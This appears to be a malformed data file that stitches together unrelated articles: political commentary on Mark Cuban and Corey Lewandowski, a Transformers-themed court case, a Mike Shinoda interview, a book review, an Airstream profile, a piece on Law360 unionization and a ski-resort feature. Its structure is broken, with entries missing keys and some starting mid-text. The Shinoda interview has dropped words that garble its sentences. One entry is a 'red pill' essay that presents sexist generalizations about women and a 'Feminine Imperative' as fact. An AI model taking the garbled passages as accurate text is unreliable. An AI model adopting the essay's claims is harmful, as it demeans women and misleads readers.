  "latent_16246": "Mark Cuban, Shark Tank billionaire, investor in 150 companies, impresario, and dedicated tech-aficionado, hates it when people tell him he toes an ideological line. Sometimes he just laughs, sometimes he rolls his eyes—and he almost always corrects that assertion. “I think for myself!” he told Tucker Carlson last week while on his show. “I’m not a liberal.” The way Cuban processes politics, personal interests, and personalities of political candidates is not unlike a swath of Americans on both sides of the political aisle.\n\nThis is the kind of view many Americans held when they elected Donald Trump for president, and likely still do. The difference between them and Mark Cuban is that they’re still happy with the president. The maverick Mavericks owner, and many who think like him, aren’t, never were, and likely never will be.\n\nOn CNN’s New Day last Friday, Cuban told anchors Chris Cuomo and Alisyn Camerota about a conversation with a friend of his, who described Trump as “political chemotherapy,” a poisonous cure to an ailing political culture. His friend voted for Trump hoping “he would change the political system” much like chemotherapy changes cancer. Cuban said, “If that’s the way you’re evaluating Donald Trump, he’s doing a phenomenal job.”\n\nI asked Cuban Friday, via his Cyberdust app, about the “political chemotherapy” comment that made several headlines. He corrected this. “I didn’t say I agreed with the political chemotherapy idea,” he told me. “Rather that people voted for him to be disruptive. People voted for him knowing the cure was as bad as the disease.”\n\nIndeed, on New Day, Cuban gave Trump a C- for his first 100 days, citing his signing a bevy of “executive orders he didn’t understand” and failing to pass a health care bill to replace the ACA legislation, a signature promise of the Trump campaign. Gallup reports Trump’s job approval in his first quarter is, at 41 percent, the lowest of any modern president by 14 points.\n\nYet, like the mass of Americans who cast their ballot for Trump, Cuban holds many ideas that conservatives traditionally embrace. “Conservatism for economics is fine. Taxes and smaller government can still do well,” Cuban told me, with one caveat—the elephant in the room: “Unless they pass Trumpcare. If that happens they [Republicans] lose in 2018.” Cuban, unlike most conservatives, believes some kind of socialized medicine should be implemented, though he admits Obamacare is flawed and needs to be fixed. He shared his own ideas for correcting the system on his blog.\n\nStill, Cuban is a fan of Ayn Rand’s economic philosophies, can’t stand the SEC, and thinks the best government is a small, efficient government that stays out of an entrepreneur’s way (for the most part). So why didn’t he shill for Trump? Why did he show up to one of the presidential debates as a guest of Hillary Clinton to the chagrin of conservatives everywhere?\n\nIt all came down to personality and qualifications. “Trump is an idiot,” Cuban told me, and it’s not the first time he’s told me that. Despite Cuban’s business interests that drive strains of conservative thinking, he still lobbied for Clinton because he believed “she would make the better president.” Cuban repeated, “[Trump] is an idiot. I’ll support a ham sandwich over an idiot.” I pushed back and reminded Cuban in terms of business and investments, Clinton advocated for policies that would increase regulations and taxes—two things he hates.\n\nCuban responded, “I can fight attempts to regulate. I can lobby whatever. I can’t fight stupidity. I can’t stop a moron that didn’t think it prudent to read about the relationship between China and the DPRK. Or might drop bombs that causes a war because it was harder to figure out than he thought. We can change tax law. We can’t change stupid.”\n\nLike many Americans, Cuban isn’t all Democrat or all Republican—he cherry-picks from both sides of the political aisle. And like Cuban, a swath of voters thought Clinton the better candidate. Unlike him, another swath of voters thought Trump would make an ideal leader of a movement for which disgusted voters have long yearned, not despite his lack of qualifications but because of them.\n\nAs Cuban said on New Day, “Some people say [Trump] started a movement; I think the movement found him.” This explains why Trump won more Democrat ic counties than anyone predicted, because they were tired of voting for politicians who do the same thing repeatedly. They, too, seem to believe there’s a disease in this country and Trump might be the cure—whether holistic or poisonous, that remains to be seen.\n\nWhile this dichotomy in Cuban is unpredictable and even disheartening for conservatives who agree with so many of his Randian ideas, Cuban isn’t a traitor because he never swore allegiance to conservatism in the first place. Like many Americans today, Cuban doesn’t have a deep political ideology that guides him—just sharp observations, pragmatic solutions, and a laser-focus on business, the economy, and investing. When conservatives—and liberals—hear him advocate for smaller, more efficient, government, declaim against the SEC and lobby for fewer regulations, they hope for a deeper ideology that drives those ideas. But that is his ideology. Everything else is extraneous.\n\nMany Americans think the same way, which is, as Twitter likes to say, “How we got Trump.” Will he be as “disruptive” as voters on both sides of the political aisle hoped? His voters likely think he is but Cuban remains nonplussed: “I don’t think he has been.” If that’s the case, it’s hard to see a scenario where the billionaire on Shark Tank who has long sparred with the billionaire in the White House becomes satisfied with what Trump does in office. Unless of course Trump starts to fix stupid.",
  "latent_16263": "Former Donald Trump campaign manager Corey Lewandowski (Mike Segar/Reuters)\n\nNever underestimate Corey Lewandowski's ability to spin a story that negatively affects President Trump into an attack on the media.\n\nThe Atlantic reported on Monday that Donald Trump Jr. exchanged private Twitter messages with WikiLeaks before and after the 2016 election — messages that the president's elder son subsequently released. The correspondence shows that WikiLeaks:\n\nTipped off Trump Jr. to the launch of a political-action website opposing his father.\n\nProvided a link, which Trump Jr. tweeted, that highlighted “many great stories the press are missing” in the hacked emails of Hillary Clinton campaign chairman John Podesta.\n\nExpressed concern about being viewed as a pro-Trump, pro-Russian source and suggested that Donald Trump release his tax returns through WikiLeaks to lend the website an appearance of neutrality and boost the impact of “the vast amount of stuff that we are publishing on Clinton.”\n\nAdvised Trump Jr. on Election Day that his father should not concede, if he were to lose.\n\nAdvised Trump Jr. to make public his own emails setting up a campaign-year meeting with a Russian lawyer, which he did.\n\nSuggested that President-elect Trump should ask Australia to name WikiLeaks founder Julian Assange its ambassador to the United States.\n\n[Donald Trump Jr. communicated with WikiLeaks during 2016 campaign]\n\nTrump Jr.'s willingness to engage with WikiLeaks certainly doesn't help the president's effort to fumigate his campaign of any whiff of collusion with Russia. CIA Director Mike Pompeo, nominated by President Trump, described WikiLeaks in April as a “nonstate hostile intelligence service often abetted by state actors like Russia.”\n\nBut Lewandowski, Trump's former campaign manager, argues that the media can't criticize Trump Jr.'s contact with WikiLeaks because the media has reported on WikiLeaks disclosures.\n\n“The mainstream media covered WikiLeaks on multiple occasions throughout the campaign for the release of those [Podesta] emails,” Lewandowski said Tuesday on CNN. “So you can’t say that they’re a Russian agent or whatever you claim that they are — maybe they are; I have no idea — and then use them when it’s convenient for the Podesta email chain.”\n\nTo state what ought to be obvious, this is a false choice. WikiLeaks can be, as Pompeo described it, a “nonstate hostile intelligence service often abetted by state actors like Russia” and also a source of newsworthy information.\n\nMedia outlets can question WikiLeaks' motives and methods but they cannot pretend that true, important information does not exist, once it is made public. Yet Lewandowski seemed to suggest that the media should have imposed a WikiLeaks blackout during the campaign.\n\n“You took information that you say came from a Russian agent, which is WikiLeaks, and you perpetuated it in your news coverage because it was newsworthy,” Lewandowski said.\n\nThe irony here is that the Trump campaign would not have wanted the media to ignore the Podesta emails published by WikiLeaks. Portions of the emails cast Clinton's campaign and the Democratic Party in an unfavorable light.\n\nBut Lewandowski is now trying to frame media coverage of the Podesta emails as a liability that weakens the media's authority to scrutinize Trump Jr.'s interactions with WikiLeaks.",

But if you look more closely, this case is far more than meets the eye.In fact, the car is decorated to mimic a character from the movie Transformers - Barricade, a \"decepticion\" robot that appears as a police car when in vehicle form.\"I believe this to be a wildly misguided, and and frankly silly attempt at a criminal charge\", attorney Matson said. \"We will establish that my client at no point committed any act that matches the criminal statute in Massachusetts for impersonation of a police officer\".Although Mr. Matson is representing a Decepticon in this case, he wanted to emphasize that he does not endorse their brutal philosophy, or their attempts to punish and enslave.\"I strongly believe my client deserves a vigorous defense, and is innocent of these charges\", Matson said. But he added, \"I would gladly represent and defend any Autobot accused of a criminal charge. We are united under the same principle that we are all entitled to legal representation, and the basic presumption that we are innocent until proven guilty. \"The case goes before a Clerk Magistrate in the Quincy District Court on September 4th.More details on the case can be found in a post at Attorney Matson's website.",

  "latent_16693": "What a lot of feminists hate about red pill theory is that it simply does a better job of predicting social behavior than feminism ever has. I’d like to think that red pill awareness has fundamentally altered (or enlightened if you’d like) intergender interpretations and understanding in a relatively short time, but that would be a mistake.\n\nThere’s a distinct group of self-evincing red pill guys who like to remind us in various comment threads that it hasn’t always been thus. Their story is our forbearers “knew better” with regard to how men and women ought to interact with one another, and essentially spelled this out for future generations in the religious and philosophical texts of antiquity.\n\nWhile I can’t deny the merit of this, I also know that the men of those bygone eras didn’t have anything approaching the mass of information and the connectivity men possess today. It’s easy to get caught up in the romanticism of the idea that back in some Golden Age of manhood, men knew about the dangers of allowing women’s hypergamous natures to run amok. I’m sure those men knew of the consequences of allowing women to control their fates. I’m sure there were Beta men and cuckolded men as well, but even the most wise Alpha among them could never, for instance, understand the impact that a unilaterally feminine-controlled form of birth control would effect upon a globalized society.\n\nThe sages of manhood-past may still have many relevant lessons for the men of today, but they simply lack the compounded experiences and understanding men possess now. Though they undoubtedly were keen observers of human behavior, the greatest thinkers of antiquity simply didn’t have an inkling as to the evolved, biological motivators of the sexual strategies our psyches developed in our hunter-gatherer human past.\n\nWhat frustrates the advocates of this bygone manhood wisdom is that for all of our collective experience and knowledge, for the past sixty or so years, men struggle to come to terms with what that masculinity should mean to them. For all of the accumulated male experience and relation of it that’s led to red pill awareness, men still grapple with ‘what being a man means to them’.\n\nUndoing of a Man\n\nWhen I do consults with men of all ages I have to begin from a presumption that what these men’s concept of masculinity is usually is the result of a deliberate attempt by the Feminine Imperative to confuse men about what being a man should be for him.\n\nEven the men who tell me they were raised by the most dominant, positively masculine fathers still suffer the internalized effects from this feminized effort to cast doubt on men’s masculinity.\n\nRecently NPR began a series of articles attempting to suss out what it means to be a man in the 21st century. I do listen to NPR, and while I know bias will always be an inevitable part of news stories, I couldn’t help but assess what a morass attempting to define masculinity has become for contemporary men. Each story, each attempt to redefine masculinity, relied on the same tired tropes the Feminine Imperative has been using for men since the start of the sexual revolution.\n\nWeakness, vulnerability, is sold as strength. Submissiveness and compromise to the feminine is sold as “support” and deserving of praise and a reciprocal appreciation (which never manifests in women). Beta is Alpha and Alpha is insecurity, bluster and compensation.\n\nThose are the main premises, and, to a large degree, most red pill aware men realize that behavior is the only true determinant of motivation, and reject the feminized, egalitarian equalist messaging. However, what still surprises me is that this same, deliberate effort to cast doubt on what masculinity should be for a man hasn’t changed its message or methods of conditioning men to accept this masculine confusion for almost 40 years now.\n\nThrough the late 80’s and up to now, the idea of anything positively masculine is either ridiculed, cast as misogynistic, or implies a man might be gay if he’s too celebratory of his maleness. Since the start of the sexual revolution, any definition of what masculinity truly should mean has been subject to the approval of the Feminine Imperative.\n\nIn the absence of a clear definition of what masculinity is for men, the Feminine Imperative is free to create as grotesque a straw man of ugly masculinity, or as beatific a feminized model of masculinity as it needs to serve its purpose. With the aid of the Male Catch 22, blurring and distorting masculinity, raising and conditioning men to accept ambiguity and doubt about the security of a ‘manhood’ they’re encouraged not to define for themselves, are all the methodologies employed to ensure a feminine-primary social order.\n\nEqualism vs. Complementarity\n\nAgreeableness and humility in men has been associated with a negative predictor of sex partners.\n\nThe problem inherent in applying reciprocal solutions to gender relations is the belief that those relations are in any way improved by an equilibrium between both sexes interests.\n\nThe Cardinal Rule of sexual strategies:\n\nFor one gender’s sexual strategy to succeed the other gender must compromise or abandon their own.\n\nThe mistake is applying a humanistic, egalitarian equalist ideal to human sexual strategies that evolved over millennia to be complementary to each other, not an equitable exchange of resources to be negotiated over. This is one reason genuine desire cannot be negotiated – this fundamental is rooted in our most primal, complemetary understanding of sex.\n\nThe point at which egalitarian equalism (the religion of feminism) fundamentally fails is presuming that intergender relations should ideally exist in a goal-state of egalitarian equalism and / or a reciprocally equal state of mutually supportive interests.\n\nHypergamy doesn’t care about equalism and reciprocity.\n\nThe sexes evolved to be complementary to each other for the betterment of the species. Why do you think women form the most secure emotional attachments to men 1-2 SMV steps above themselves? Why is masculine dominance such an attractive male aspect for even the most feminist of women who’d otherwise plead for equality among the sexes?\n\nI have a bit of a weird relationship with “traditional masculinity”. I’ve looked critically at it enough to know how much damage it does as a paradigm. I’ve seen the harm it can do to both men and women on an individual level. I’ve been subject to the violence it encourages. But despite all that, holy shit does it ever turn me on. […] There’s just something about assertiveness (let’s be real, sometimes flat out arrogance) that does it for me. No matter how much I can be attracted to someone emotionally and intellectually, my swoons only happen when confronted by a powerful, competent man. This has lead to some issues in my personal life. Who knew being attracted almost exclusively to men that inherently make bad partners wouldn’t work out well for me?\n\nWhat we’re observing here is a rudimentary conflict between an internalized humanist idealism (the way equalism teaches thing’s should be) versus evolved, impulsive realism (the way things are).\n\nThe doctrine of equalism presumes a socialized expectation of being turned-on or attracted to men exemplifying a ‘gender equitable’, equalist-correct, mindset and the evolved, visceral arousal / attraction to a man exhibiting the dominant characteristic traits of masculine complementarity.\n\nAnother example of this conflict can be found in my essay on Choreplay.\n\nIn 2008 the transactional nature of sex-for-equitable-services was an over blown meme. The message then was that men needed to do more feminine-typical chores around the house, and the equitable exchange would be his wife reciprocating with more frequent and more intense sex as a result of his “equitable” participation in that negotiation.\n\nFast forward to 2013 and now (by the same author mind you):\n\nHey, fellas, put down those vacuum cleaners and pull out the lawn mowers. Married men may think helping around the house may up their hotness quotient in the bedroom, but what really matters is the type of chore. Heterosexual married men who spend their time doing yard work, paying bills and changing the oil have more sex than husbands who spend their time cooking, cleaning and shopping, according to a new study on the subject of housework and sex. “Households with a more traditional gender division of labor report higher sexual frequency than households with less traditional gender divisions of labor,”…\n\nSo what you see illustrated here, in just the space of 5 years, is the frustration and conflict between an equalist idealized model vs. the evolved complementary model of gender relations. It’s not about the equitability of like for like exchanges or like for like reward/benefit, but rather the way that equitability is expressed and how it grates against instinctually human expectations of behavior.\n\nSex differences, biologically and psychologically, didn’t evolve for hundreds of thousands of years to be co-equal partnerships based on humanistic (or moralistic) idealism. They evolved into a complementary form of support where the aspects of one sex’s strengths compensated for the other’s weaknesses and vice versa.\n\nFor every behavioral manifestation of one sex’s sexual strategy (hypergamy in females), the other sex evolves psychological, sociological and behavioral contingencies to counter it (mate guarding in males). The ideal state of gender parity isn’t a negotiation of acceptable terms for some Pollyanna ideal of gender equilibrium, it’s a state of complementarity between the sexes that accepts our evolved differences – and by each individual gender’s conditions, sometimes that’s going to mean accepting unequal circumstances.\n\nFeminists (and anti-feminist women), humanists, moral absolutists, and even red pill men still obliviously clinging to the vestiges of their egalitarian blue pill conditioning, will all end up having their ideologies challenged, frustrated and confounded by the root presumption that egalitarian equalism can ever, or should ever, trump an innate and evolved operative state of gender complementarity.\n\nAnd thus we come full circle, back to a new model of masculinity that is found upon the evolved complementary order and aided by red pill awareness. I have no doubt that it will be an arduous process of acceptance for blue pill, masculine-confused men vainly attempting to define their own masculinity under the deliberately ambiguous contexts laid out for them by the Feminine Imperative, but I do (hopefully) believe that red pill awareness is already making a positive impact on countering a presumption of equalism that only truly serves feminine primacy.\n\nIt’ll take time, but with every aware man utilizing red pill awareness to realign his masculine identity and benefit from it, other men will begin to come to the same awareness or else fall off into their own ambiguity.\n\nLike this: Like Loading...",
  "latent_17089": "Feature\n\nAhead of a one-off London show, Mike Shinoda talks finding space for Fort Minor in a world dominated by Linkin Park\n\nPublished: 10:00 am, September 08, 2015\n\n“People forget what it was like in 2000 to come out with this band,” reflectsof’s origins. “Back then people listened to a style but now, you cant even pull one genre from another. Everything’s so mixed and that’s exciting,\" he exclaims. \"The most exciting music out right now is stuff that’s above genre.“Linkin Park are currently winding down the album cycle for '' before disappearing into the studio to work on album seven. There are 50 demos already floating about alongside a sense that “our best work could be infront of us. I feel really inspired.”“I like to think our music has had some role in blending genres,” offers Mike en route to Moscow. “That’s what our music has been about since day one. We never felt like we carried a flag for Nu-Metal but we definitely carried a flag for people who loved many types of music. What we did in the beginning was differentiated from the other groups that did similar stuff because of our aesthetic and reference points. People would say they were in a rap rock band and that’s where they left it. For us, we asked what kind of Rap, what kind of Hip-Hop. I grew up on Hip-Hop,” explains Mike. “It’s the only thing I listened to for three quarters of my life so those reference points were super specific and that’s what I brought into our band,” he continues before listing his influences,as well as the West Coast scene. “There wasn’t aoralbum that I didn’t buy.”Originally conceived back in 2005,was a way for Mike to explore those hip-hop leanings away from the band. “The first two Linkin Park albums were very similar in style, so a bunch of hip-hop songs didn’t feel like they would fit.” An album, ‘The Rising Tied’ followed but as Linkin Park “decided to drastically broaden our horizons, every idea was appropriate,” Fort Minor fell by the wayside. “We opened the door to anything, so over the years any Fort Minorish ideas became a Linkin Park song,” explains Mike. However, “a few months ago I came up with this song ‘Welcome’. I listened to it and it was just me. It didn’t sound like Linkin Park. It didn’t sound like anyone else. It always just felt like a Fort Minor song so I decided to put it out and it opened the door back up.”“I played it to the guys and they loved it,” explains Mike. “I knew that meant they were considering it for the next Linkin Park album but I told them I didn’t want it to go in that direction and they were supportive. These are good dudes, these are my best friends in the world.”“The idea with the Fort Minor stuff was I wanted it to be fun, not only for me but for the fans,” starts Mike Shinoda who, inbetween arena shows, has been performing a handful of intimate one-man shows.“I’m not planning on putting out another Fort Minor album, I’m not planning on going on tour so these shows are meant to feel exclusive and fun,” explains Mike. “It’s mostly album cuts and b-sides. Fort Minor’s always been a thing for the fans so I’m doing some stuff on this tour you won’t hear anywhere else. We or I haven’t released any of this stuff ever, the only place you’ll be able to hear it is at the show.”“I realised there had to be a very specific role for this to play in my world because the Linkin Park stuff is so all encompassing. It’s so big and so much work that the Fort Minor stuff has to be fun. It’s why I’m going to play these small shows inbetween Linkin Park shows, I’m going to do stuff that Linkin Park effectively doesn’t do. The fans want to hear the rarities, they want to hear the weird stuff and that’s what the Fort Minor show is all about. When we’re choosing a Linkin Park setlist, we’re thinking about a crowd of between 15,000 and 50,000 people. There are things you can do in a 1000 capacity venue that you can’t do in those other venues,” ventures Mike of his live show.“It’s a one man show and it doesn’t feel like anything else. I set up the whole show so I can walk in and do it completely on my own out of a headphone jack, if I had to. I could literally just plug into the stereo of your house and play a show, which is really far removed from Linkin Park’s stage setup. It’s pretty much the polar opposite.”“It’s a personal challenge,” admits Mike on performing solo.“I’m not that guy. For me to even get on stage with the other five guys in the beginning was a bit of a challenge. I really had to find my confidence to be up there that way. When I did the Fort Minor project before, I put a band together because I was too chicken shit to get up there by myself. This is supposed to be fun, so now I just want to talk to the fans by myself. Lets not bring anyone else into it. I’m going to challenge myself to keep it as entertaining as I can, as a single individual onstage and see where that takes me.”",
  "latent_17118": "Steven Pearlstein is a Post economics and business writer. He is also the Robinson Professor of Public Affairs at George Mason University.\n\nA curious thing has happened in the three decades since Ronald Reagan swept into office declaring that government is the problem rather than the solution. Much to the chagrin of Reagan’s ideological heirs, government has continued to grow as Americans have demanded more education, better health care, and greater economic and physical security. Even as liberals have achieved these modest increases in spending and regulation, however, they have been reluctant — Bernie Sanders has been a prominent exception — to offer a full-throated defense of the idea that a wealthier and more complex society demands more government, not less.\n\nThat is precisely what Jacob Hacker and Paul Pierson aim to do in their latest collaboration, “American Amnesia.” In the century before Reagan, they note, the United States grew to become the world’s richest, most powerful and most admired country. And it did so, they argue persuasively, not in spite of the rapid growth in the size and reach of government, but precisely because of it — because government put a high school and college education within reach of all its citizens, because government made serious and systematic investments in railroads, highways and scientific research, because government protected investors and workers and consumers from the natural excesses of market competition and put an economic safety net under all Americans.\n\nAnd it’s not just America. Across the world, the authors note, the richest countries invariably allocate a large share of their economic output to government, while the poorest tend to allocate the least. It is neither the government-run nor the free-market economies that prosper but rather the mixed economies that have proved to be the most durable and successful.\n\nThe economics of all this is pretty well established. But Hacker and Pierson are not economists — they are political scientists at Yale and Berkeley who mean to explain why and how the mixed economy became so unloved and its successes so quickly forgotten.\n\nTo illustrate the change, they start by comparing the actions and attitudes of George Romney — president of American Motors Corp., governor of Michigan, and secretary of housing and urban development in the Nixon administration — with those of his son Mitt Romney, a private-equity-fund manager who leveraged his fortune to become governor of Massachusetts and the Republican nominee for president in 2012.\n\nThe elder Romney, they write, understood that prosperity is not an individual achievement but is generated by the collective efforts of managers, workers, customers and the community at large. As a liberal Republican governor, he worked with Democrats to raise Michigan’s minimum wage, enact an income tax, double state spending for education and increase benefits for the poor and the unemployed. Paeans to “rugged individualism,” the elder Romney declared, were “nothing but a political banner to cover up greed.”\n\nA generation later, a much more conservative Mitt Romney was helping to pioneer a different model of capitalism, one built on successful companies run by heroic, job-creating entrepreneurs whose only legitimate goal was to maximize profits for shareholders and themselves. And as he famously revealed while speaking to well-heeled political contributors, the younger Romney saw great danger in a welfare state that now had so many citizens reliant on government for their livelihoods that they would use their political power to impose burdensome taxes and regulations on genuine wealth creators.\n\nIn trying to explain this “breathtaking” transformation of business norms and political opinion, Hacker and Pierson fall into the common trap of trying to construct a simple narrative of cause and effect, good guys and bad guys. They largely repackage the familiar liberal tale of a disciplined, well-funded conspiracy to spread free-market propaganda through a network of right-wing think tanks and media outlets, eventually overwhelming the hapless mainstream press and reshaping the public debate. Meanwhile, using gobs of political money, the anti-government crusaders succeeded in driving out moderates to capture control of a Republican Party whose only goals now are to starve government of funds and force it into a permanent state of political stalemate and dysfunction — a dysfunction that further reinforces the message that government is inept.\n\nIt’s easy enough for the authors to find plenty of historical evidence to support this narrative. There is, for example, then-Rep. Newt Gingrich’s speech to the Heritage Foundation in 1988 in which he called for an assault on liberalism that “has to be fought with a scale and a duration and a savagery that is only true of civil wars.” And there is venture capitalist Tom Perkins’s suggestion that people who pay more taxes should get more votes. The reader, however, can find a much more deeply and freshly reported version of these developments in Jane Mayer’s new book on the Koch brothers (“Dark Money”), or a more cogent and original analysis of them in Washington Post columnist E.J. Dionne’s latest (“Why the Right Went Wrong”).\n\nThe problem with the standard liberal narrative is that it ignores some inconvenient realities, such as that Democrats and their allies have raised and spent as much money as Republicans in recent election cycles, or that Bill Clinton and Barack Obama each won two presidential elections and had notable success in achieving their policy goals despite relentless opposition from the conservative noise machine. The political scientists rightfully note that the reason Republicans have gained political traction is not because more Americans agree with their conservative policies but because Americans have become more distrustful of government. They seem to have a blind spot, however, for some of the valid reasons Americans have become so distrustful: misguided and costly wars, a soaring budget deficit, the failure of government policies to end persistent poverty, the botched rollout of Obamacare. They also ignore that the conspirators themselves — big business, Wall Street, the energy industry and the Republican Party — have suffered a similar decline in trust.\n\nThe more convincing part of Hacker and Pierson’s narrative concerns the transformation of the organized business community. They show how groups such as the Chamber of Commerce and the Business Roundtable went from being moderating political forces, whose leaders acted as stewards of the national interest, to becoming highly partisan special interest groups determined to boost corporate profits by buying elections and thwarting all regulation, degrading the country’s political and legal institutions in the process. Business leaders who are now horrified at the prospect of Ted Cruz or Donald Trump as president have only themselves to blame, the authors suggest, for creating the political dynamics and economic circumstances that have made those candidacies possible.\n\nWhile much of “American Amnesia” turns out to be an unsatisfying rehash of recent history, its basic political insight is sound: The only way for Democrats to regain the political momentum is to purge from the American imagination the myth that the government that governs best is the government that governs least.",
  "latent_17167": "At Home: Living in an Icon\n\nJoe DeLoss wanted a change. He was living in a cape cod home in Bexley and had a decent amount of stuff. Not anywhere near the level of a hoarder, but it was starting to feel overwhelming. So he was looking to pare down. Change his lifestyle. Become less tied down to a mortgage with traditional home ownership and all of the aspects that are part of that. He had always thought about living in an iconic Airstream trailer. The beauty of being able to move your home where you’d like, its attractive style and sleek design, the limiting 165 square feet of space that would keep your personal belongings to a minimum – it all intrigued him. His search turned up exactly what he wanted on Craigslist.\n\nHe found a 1963 Airstream Overlander, originally made at the Jackson Center, Ohio factory. It had been gutted and repaired just enough that he could make the changes he wanted and it was close – a mere hour or so away in Danville. It was perfect. He put his house on the market, thinking it would take some time to sell (this was only last year after all) and he would be able to fix up the Airstream at a leisurely pace. Then the house sold very quickly and he found himself needing a living space for himself and his beautiful Weimaraner B. He was able to get the electric fully upgraded with a larger electrical box, added new flooring, installed the kitchen set (combo mini-fridge/stove-top/sink/water-pump), picked up a decommissioned locker from Pattycake Bakery and painted the Airstream’s interior a bright lime green.\n\nBefore view, looking toward the back of the Airstream\n\nBefore view, looking toward the front of the Airstream\n\nWork in progress\n\nHe kept the original closets. Removing the doors keeps his possessions in view and makes editing them easier. Joe is happy to have 100% of his possessions in his small home. He likes to follow the one-in-one-out philosophy, where he must get rid of one thing in order to add a new one.\n\nWith his new living space came a new way of life. Except for consumables, Joe has not bought anything new this year. Everything he has needed, he has found second hand. He does admit that a friend gave him a heated blanket for his birthday which was a welcomed gift during this cold winter. Getting through the cold weather was part of his trial phase and he feels that went well and looks forward to really making the place into a home and not a trailer.\n\nSome of the ideas he has to upgrade his “urban off-the-grid condo” include: covering the wheel wells with storage, adding a flippable combination bed/sofa to give the space a livable workspace vibe, installing a full bathroom and a low current electric composting toilet, adding solar power panels, redoing the windows, adding a mini gas fireplace as the main heating source and perhaps working a full size sink in there as well. In the warmer months, he enjoys relaxing outside. The Airstream has an awning for shade and he has a grill for cooking. (Airstream Print by artist Maggy O’Reilly VanOrder of Orielly Ink).\n\nJoe really is enjoying this new way of life. It has been part of a conscious decision to help him be very entrepreneurial because he does not have many debt obligations.

  "latent_17300": "When I left my job as a senior reporter at Law360 last summer, the farewell was bittersweet. I’d had my quibbles with the company’s management and editorial policies, but I also learned a ton, grew as a journalist and made friends.\n\nWe ate cake on my last day.\n\nADVERTISEMENT\n\nA month later, and two weeks into an exciting new job at Reuters, I had just finished two days of breaking news training when I received a threatening letter from Law360 telling me I was violating the company’s non-compete agreement. The Law360 non-compete clause stipulated I could not work for another legal news organization for a full year following the end of my employment. Unbeknownst to me at the time, Law360 also asked the general counsel of Thomson Reuters to “take immediate steps” to ensure I did not disclose any of the “critical and sensitive confidential” information I allegedly gained in my two years there.\n\nWithin two days, I was fired.\n\nLaw360 rescinded its non-compete clause last month under pressure from the New York Attorney General, but my firing sparked a wave of outrage in the newsroom that ultimately led a majority of editorial employees to seek union representation.\n\nAs E. Tammy Kim wrote in Dissent Magazine this week, Law360 employees are the latest in what some have described as a “wave” of digital newsroom unionizations - they follow in the footsteps of reporters at Gawker, the Guardian US, ThinkProgress, and The Huffington Post.\n\nThe ever-shrinking legacy newspaper business is also seeing newsrooms turn to collective bargaining to beat back owners who have turned to layoffs and cuts to secure higher profit margins. Two newsrooms in Illinois organized unions to counter cuts and content demands from Gatehouse. And The Ledger in Lakeland, Fla., recently moved toward forming a union in hopes it can stop more cuts to the newsroom by Gatehouse, according to a report by the Columbia Journalism Review.\n\nThe rank-and-file of the Law360 newsroom have their work cut out for them. On Thursday, a human resources representative sent reporters an email saying Law360 would not voluntarily recognize the union. The company has also hired the notorious union-busting law firm Jackson Lewis and will be pushing for extra time before an NLRB vote, according to the News Guild. Newsroom employees, who have already had 10 months to think about their options, are hoping to cast their ballots in early August.\n\nWhen I worked at Law360, I was under the impression that the company and its (mostly) young reporters had an implied social contract. We would agree to churn out stories for low pay in return for a few years of experience and the chance to step up to a bigger publication -- Reuters, Bloomberg, The Wall Street Journal. When I was fired from Reuters, do in part to the actions of Law360, that implied social contract was revealed for what it always was — an illusion.\n\nThe refrain I so often heard from colleagues the Law360 newsroom - “hey, at least we have jobs in journalism” - was a salve against their growing frustrations with pay, story quotas and long often uncompensated hours. The working conditions in digital newsrooms may not inspire sympathy the way physical laborers do on the factory floor, but that does not mean they are easy. Digital journalists are continually expected to write more content, at a faster pace, for less pay. We are also told that we need to produce scoops, that quality matters, that we must compete to shape news coverage. Like many other white collar workers, we are expected to be tethered to our phones 24/7.\n\nBurnout and financial insecurity are the most common complaints I hear from journalists who have left the industry. A talented former colleague of mine recently joined PR firm after seven years of beat reporting, saying he was driven out by ever-increasing page view quotas and constant pressure to sensationalize the news.\n\nAs content marketing continues to grow into its own industry, digital journalists also bear witness to the crumbling of church/state divisions between advertisement and reporting. We’re expected to remain objective while keeping our readers happy. But as these difficulties pile up, digital journalists are expected to be grateful just to have work, to have a byline. That’s particularly true of freelancers, which I am now, who fight over the chance to earn $150 for three days worth of reporting and writing, or who will work for no pay just for the coveted prize of “exposure.”\n\nUnions haven’t been able to protect journalism from all these market forces, and it shouldn’t be a surprise that unionized digital writers still represent a small portion of the news industry. “In the shadow of ongoing cuts and the uncertainty of the digital economy, it’s hard enough to tread water—let alone while holding hands,” wrote E. Tammy Kim.\n\nI don’t think the journalists of the digital newsroom think they’re insulating themselves from the volatility and uncertainty of the market by unionizing. But they’re seizing on one of the few mechanisms of power available to them.\n\nThe unionization of digital newsrooms is, like most labor movements, a struggle between workers and the powers that employ them. In this sense, these efforts are nothing new. But they also represent the desire to resist the forces of individualization wrought upon all of us by the gig economy, the digital demand for personal brands, and the shrinking of the American safety net.\n\nWhen newspapers first started unionizing in the 1930s, journalists “linked their cultural labor to systemic labor struggles,” wrote Michelle Chen in The Nation after the now-shuttered Al Jazeera America digital newsroom announced it would unionize last year.\n\nJournalists in the digital newsroom can do the same.\n\nRussell-Kraft is a freelance reporter based in New York.

  "latent_17332": "Opening in 1966, the French ski resort of Avoriaz was only accessible by cable car and looked like something from an expressionist movie. It still does, and there are still no cars to be seen...\n\nWords and images: Alastair Philip Wiper\n\nRedolent of the sets from the German expressionist classic The Cabinet of Dr Caligari, the Sixties' ski resort of Avoriaz in the French Alps was pioneering in many ways, not least in that cars were never part of the plan. When seen from afar, the buildings appear to blend in with the mountains. The resort was planned so that every door opens to a piste to the bottom of town, while a series of public lifts carry people back up to the top of the town. You can ski to the shops to pick up your groceries, then take a lift back to your apartment. If you want to go from one part of town to the other, a horse-drawn sleigh will take you there.\n\n© Alastair Philip Wiper\n\nA little more than an hour's drive from Geneva and 1,800m above sea level, it is part of the Portes du Soleil ski area. Avoriaz started life as a desolate plateau, on a cliff high above the town of Morzine. In the summer it was used by a few goat herders, and in the winter it was not used at all, until a few brave skiers started to venture up there -- the old-fashioned way, walking all the way up and then skiing down very quickly. One of those energetic people was Jean Vuarnet, a child of Morzine, and winner of the 1960 Olympics' men's downhill. After returning from the Games, he was asked by the municipality of Morzine to develop a new area for skiing around the town, and Vuarnet proposed the plateau as the site for a purpose-built resort of Avoriaz.Vuarnet unearthed an investor in the shape of Gerard Bremond, the son of a rich industrialist and part of the French jet set. Bremond wanted a 'Saint Tropez de Neige' -- a Swinging Sixties resort, with high-profile guests frolicking in the snow drinking champagne. But he was also a visionary -- he had a strong passion for jazz and film -- and he wanted to create a totally unique resort, which embraced the modern world but was also in harmony with nature.\n\n© Alastair Philip Wiper\n\n'When one goes on holiday. one hopes to find a different context to the one in which one lives daily,' extolled Bremond. 